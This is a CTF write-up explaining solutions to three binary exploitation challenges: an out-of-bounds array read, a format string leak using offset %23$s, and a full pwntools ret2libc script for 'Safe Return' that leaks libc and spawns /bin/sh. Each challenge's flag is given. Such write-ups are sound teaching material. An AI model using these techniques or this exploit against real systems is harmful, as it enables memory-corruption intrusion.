---
title: "Neuland CTF 2023 Winter - PWN/Binary Exploitation"
authors: ["Neuland CTF Orga"]
date: 2023-12-09T21:00
published: true
tags:
- ctf
- writeup
- security
- cyber
- cybersecurity
---

</br>

Download challenges: [Neuland CTF Repository](https://github.com/neuland-ingolstadt/Neuland-CTF-2023-Winter)

</br>

## Higher and Lower - Easy
*No one has guessed my number yet, maybe you can find another way to get the flag.*

[higher_lower.c](/files/neuland-ctf-12-2023/higher_lower.c)

</br>

The program is the well-known children's game higher or lower. However, as the author teases in the description, there is probably no way to win the game fairly. In the enclosed C code, the flag is initially defined and then referenced in the main. Furthermore, the inefficient design decision was made to use an array to select the numbers. Our guessed number is used as an index for this array, and the respective position is output. Since the flag variable in the stack is right next to the array, and the input is not sanitized, we might have a chance to query the flag above it. Depending on the compiler, we print the segment by calling index *-1* or *11*, which is no longer in the array but outputs the surrounding variables.

</br>

The flag is `nland{practical_application_abandoned}`.

</br>

## Secure4Sure - Easy
*Works as intended?*

[Secure4Sure.c](/files/neuland-ctf-12-2023/Secure4Sure.c)

</br>

We get C code, which appears to be the login for Secure4Sure. The user can enter an access code, and the program compares it with the hardcoded string at the beginning of the program. The user input looks like a suitable attack vector because it is printed later in the program. The fgets() function reads a line of the specified input stream and stores it in the buffer variable. These are the perfect conditions for a format string attack that uses printf() features. For example, the string to be output can be manipulated using special commands such as *%s* or *%d*. `printf("My %s is", name)`. *%s* which expects a string is replaced by the contents of the name variable. Printf() reads the previous address from the stack. So if we typed *printf(%s %s)* we would get the last two strings on the stack. However, if this input is longer than the maximum length defined in fgets(), we get a segment fault. Another string format feature is *%&lt;nth address>$s*, which jumps directly to the specified point in the stack. If we write *%p* as input, the program returns the pointer address. With this address, you can look at the stack and calculate the offset. A more straightforward method that does not require precise knowledge of the stack and how it works is fuzzing. Here, you can try out all offsets until the access code is output. With the locally used compiler, the correct offset was *%23$s*.

![](../../src/blog/images/neuland-ctf-12-2023/Secure4Sure.webp)

</br>

The flag is `nland{DIN13432}`.

</br>

## Safe Return - Hard
Author: [Jonny](https://github.com/Baikuya)</br>

*There is always a safe place to return :).*

[Safe_Return.c](/files/neuland-ctf-12-2023/Safe_Return.c)

</br>

```
from pwn import *

p = process("./Safe_Return")
write_addr = 0x08049291
puts_addr = 0x08049245
hello_addr = 0x0804a008
got_read = 0x0804c004
p.send(b"A"*0x34)
p.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recv(4)
ebp_bytes = p.recv(4)
ebp = u32(ebp_bytes)
print(hex(ebp))
safe_function = 0x080491b6
ret_nop=0x080491e4
p.recvuntil(b"\n")
payload = b"A"*0x48+p32(ebp)+p32(puts_addr)+p32(got_read)+p32(0)*2+p32(safe_function)
payload += b"A"*(0x80-len(payload))

p.send(payload)
read_leak = u32(p.clean(timeout=1)[:4])
read_offset = 0x0011e0a0
print(hex(read_leak))
libc_base = read_leak-read_offset
print(hex(libc_base))

system = libc_base + 0x0004f600
payload = b"A"*0x48+p32(ebp)+p32(system)+p32(0)+p32(ebp+20)+b"/bin/sh\x00"
payload += b"A"*(0x80-len(payload))
p.send(payload)

p.interactive()
```

</br>

The flag is `nland{G0_TO_J0NNy_And_Say_KinkoFe}`.
